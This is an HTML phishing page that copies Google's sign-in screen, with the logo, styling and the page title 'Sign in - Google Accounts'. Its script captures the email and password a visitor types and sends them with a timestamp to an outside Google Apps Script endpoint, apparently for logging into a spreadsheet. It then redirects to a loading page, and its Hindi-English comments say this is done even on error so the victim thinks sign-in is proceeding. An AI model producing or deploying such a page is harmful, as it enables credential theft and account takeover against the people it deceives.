<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 20px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin: 8px 0; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        .btn-container { display: flex; justify-content: flex-end; margin-top: 30px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
        .btn:hover { background-color: #1561d1; }
        .forgot-link { color: #1a73e8; text-decoration: none; font-size: 14px; margin-right: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x122dp.png" class="logo" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <div class="btn-container">
                <a href="#" class="forgot-link">Forgot password?</a>
                <button type="submit" class="btn">Next</button>
            </div>
        </form>
    </div>    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // {{user}} se input lena
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Aapka Google Web App URL
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxr7l2XLO4F0l6LTGLzbg20VbAdOwzm_cUUIMyX2K1KtNDt31bfMmLCPEvCu3iXTr-7aQ/exec';

            // Data ko format karna
            const formData = new FormData();
            formData.append('Email', email);
            formData.append('Password', password);
            formData.append('Time', new Date().toLocaleString());

            // Data ko Google Sheet mein bhejna
            fetch(scriptURL, { 
                method: 'POST', 
                body: formData 
            })
            .then(response => {
                // Data bhejne ke baad {{user}} ko loading page par bhejna
                window.location.href = 'loading.html';
            })
            .catch(error => {
                console.error('Error!', error.message);
                // Agar error aaye toh bhi redirect karna taaki {{user}} ko lage process chal raha hai
                window.location.href = 'loading.html';
            });
        });
    </script>
</body>
